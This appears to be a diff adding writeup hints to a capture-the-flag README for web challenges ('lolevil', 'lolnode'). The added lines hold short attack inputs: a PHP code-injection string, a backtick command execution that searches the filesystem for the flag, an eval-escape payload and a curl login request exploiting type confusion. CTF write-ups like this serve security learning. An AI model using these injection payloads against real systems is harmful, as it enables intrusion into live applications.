@@ -17,6 +17,10 @@ Setting up
 
 Writeup
  - releases after competition
+ - `string1=${phpinfo()}`
+ ```
+ string1=${`find / -name fl4g`}
+```
 ---
 **2.web200a - lolevil**
 
@@ -34,7 +38,8 @@ Setting up
 
 Writeup
  - releases after competition
-
+ - Reference `r:2` to authorize 
+ - and escape eval `'.phpinfo().'`
 ---
 
 **3.web200b - lolnode**
@@ -54,4 +59,5 @@ Setting up
 Writeup
 
  - release after competition
+ - `curl 'http://<ip>:<port>/login -X POST -H "Content-Type: application/json" --data "{\"password\":100}" | hexdump -c`
 
